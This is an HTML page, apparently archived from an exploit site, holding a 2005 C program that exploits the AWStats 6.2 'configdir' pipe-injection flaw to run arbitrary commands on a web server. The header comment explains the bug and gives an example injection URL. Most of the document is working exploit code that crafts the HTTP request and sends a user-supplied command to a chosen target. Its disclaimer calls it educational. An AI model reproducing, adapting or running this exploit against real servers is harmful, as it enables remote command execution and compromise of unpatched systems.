<html><head><title>AWStats configdir Remote Command Execution Exploit (c code)</title></head><pre> /*
AwStats exploit by Thunder, molnar_rcs@yahoo.com

This exploit makes use of the remote command execution bug discovered in
AwStats ver 6.2 and below. The bug resides in the awstats.pl perl script.
The script does not sanitise correctly the user input for the
`configdir` parameter. If the users sends a command prefixed and postfixed
with | , the command will be executed. An example would be:

Let's execute '/usr/bin/w':
&gt;
http://localhost/cgi-bin/awstats.pl?configdir=%20|%20/usr/bin/w%20|%20
&lt;

Awstat output:
&gt;
Error: LogFile parameter is not defined in config/domain file
Setup (' | /usr/bin/w | /awstats.localhost.conf' file, web server or permissions) may be wrong.
Check config file, permissions and AWStats documentation (in 'docs' directory).
&lt;

That's it. Our command was executed.
This bug is fixed in AwStats ver 6.3 and a patch was released for all versions, but vulnerable
AwStat is still available for download on several sites (ex. www.topshareware.com).

Type `gcc awexpl.c - o awexpl` to compile the exploit and `./awexpl -u` for usage.

Note:
Just indexing the commands with | will not always work, or might not work at all. I checked
it on my own awstats 6.0 install, and it failed. So, whoever tried the same on his own
script and was surprised to see that (although the version he uses is said to be prone to the
remote command execution bug) nothing happened, should patch or upgrade to Awstat 6.3 asap.
As far as i know all unpached versions prior to 6.3 are vulnerable and commands prefixed and
postfixed by a | character WILL be executed. Beware!

Oh, I almost forgot, the disclaimer :)

THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
AND WITHOUT ANY WARRANTY.

Robert Molnar,
21th jan 2005
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
//#include &lt;unistd.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;string.h&gt;

void usage(char *pname)
{
printf(&quot;# AWStats exploit by Thunder, molnar_rcs@yahoo.com\n&quot;
&quot;# Usage: %s -h &lt;host&gt; -i &lt;ip&gt; [-s Script] [-p Path] [-o Port] [-c Commands] [-u]\n&quot;
&quot;\t-h : target host name, default is `localhost`\n&quot;
&quot;\t-i : target IP (to wich host name resolvs)\n&quot;
&quot;\t-s : script name, default is `awstats.pl`\n&quot;
&quot;\t-p : script path, default is `/cgi-bin`\n&quot;
&quot;\t-o : specify port to connect to, default is `80`\n&quot;
&quot;\t-c : specify commands to be executed, the exploit will create a\n&quot;
&quot;\t : file named `OWNED` in `/tmp` by default\n&quot;
&quot;\t-u : usage\n\n&quot;
&quot;# Example: %s -h localhost -i 127.0.0.1\n&quot;
&quot;# : %s -h localhost -i 127.0.0.1 -p /~user/cgi-bin\n&quot;
&quot;# : %s -h localhost -i 127.0.0.1 -p /~user/cgi-bin -c \&quot;/usr/bin/id\&quot;\n&quot;
, pname, pname, pname, pname);

exit(0);
}

char * urlEncode(char *inC)
{
int c, i, j = 0;
char *h = &quot;0123456789abcdef&quot;;
char retval[1024], res[3072];
memcpy(retval, inC, strlen(inC));
retval[strlen(inC)] = '\0';
for(i=0; i &lt; strlen(inC); i++){
c = retval[i];
if( 'a' &lt;= c &amp;&amp; c &lt;= 'z'
|| 'A' &lt;= c &amp;&amp; c &lt;= 'Z'
|| '0' &lt;= c &amp;&amp; c &lt;= '9'
|| c == '-' || c == '_' || c == '.')
res[j++] = c;
else {
res[j++] = '%';
res[j++] = h[c &gt;&gt; 4];
res[j++] = h[c &amp; 0x0f];
}
}
return res;

}


char *buildHeader(char *Xhost, char *Xpath,char *Xscript, char *exeCmd)
{
char Header[5196];

sprintf( Header,
&quot;GET %s/%s?configdir=%s HTTP/1.1\r\n&quot;
&quot;Accept: text/xml,application/xml,application/xhtml+xml,&quot;
&quot;text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,&quot;
&quot;image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\r\n&quot;
&quot;Accept-Language: en-us\r\n&quot;
&quot;Accept-Encoding: deflate, gzip\r\n&quot;
&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)\r\n&quot;
&quot;Host: %s\r\n&quot;
&quot;Connection: Keep-Alive\r\n&quot;
&quot;Cache-Control: no-cache\r\n&quot;
&quot;\r\n&quot;
, Xpath, Xscript, urlEncode(exeCmd), Xhost );
return Header;
}


void exploit(char *Xhost, char *Xpath,char *Xscript, char *exeCmd, char *Xip, int Xport)
{
int sock, disp = 0, count = 0;
struct sockaddr_in sockaddrX;
char *oData, iData;

printf(&quot;# AWStats Exploit by Thunder, molnar_rcs@yahoo.com\n&quot;);
sockaddrX.sin_port = htons(Xport);
sockaddrX.sin_family = AF_INET;
sockaddrX.sin_addr.s_addr = inet_addr(Xip);
if(Xhost == &quot;localhost&quot;)
{
printf(&quot;# Using hardcoded (default) options, use `-u` for usage\n&quot;
);
}
printf(&quot;# Connecting to %s (%s) ...&quot;, Xhost, Xip);
sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
if (connect(sock, (struct sockaddr*)&amp;sockaddrX, 16) &lt; 0)
{
printf(&quot;\n# Connect to %s (%s) on port %i failed!\n&quot;, Xhost, Xip, Xport);
exit(-1);
}
printf(&quot;Done!\n# Building header...&quot;);
oData = buildHeader(Xhost, Xpath, Xscript, exeCmd);
printf(&quot;Done!\n# Sending data...&quot;);
send(sock, oData, strlen(oData), 0);

/* the code below reads the server response byte by byte, this is not needed
while(read(sock, &amp;iData, 1))
putchar(iData);
*/
printf(&quot;Done!\n# Exploit finished.\n&quot;);
close(sock);
}





int main(int argc, char * argv[])
{
extern char *optarg;
extern int optind, optopt;

int c,
Xport = 80,
isgood = 0;

char *Xhost = &quot;localhost&quot; ,
*Xip = &quot;127.0.0.1&quot;,
*Xscript = &quot;awstats.pl&quot;,
*Xpath = &quot;/cgi-bin&quot;;

char exeCmd[1024] = &quot;| echo \&quot;You have been Owned, update AWstat or patch\&quot; &gt; /tmp/OWNED | &quot;;

while ((c = getopt(argc, argv, &quot;:uh:i:s:p:c:o:&quot;)) != -1)
{

switch(c)
{
case 'h':
Xhost = optarg;
isgood++;
break;

case 'i':
Xip = optarg;
isgood++;
break;

case 's':
Xscript = optarg;
break;

case 'p':
Xpath = optarg;
break;

case 'c':
if(strlen(optarg) &gt; 1018)
{
printf(&quot;# `-c` argument can't exceed 1024 bytes (command to long)&quot;);
exit(0);
}
sprintf(exeCmd, &quot; | %s | &quot;, optarg);
break;

case 'o':
Xport = atoi(optarg);
break;

case 'u':
usage(argv[0]);
break;

case '?':
printf(&quot;# Unknown option `-%c`\n&quot;, optopt);
break;


}
}


if( isgood == 1)
{
printf(&quot;# Please specify both host `-h` and ip `-i`\n&quot;);
exit(0);
}

exploit(Xhost, Xpath, Xscript, exeCmd, Xip, Xport);
return 0;
}

// milw0rm.com [2005-01-25]</pre></html>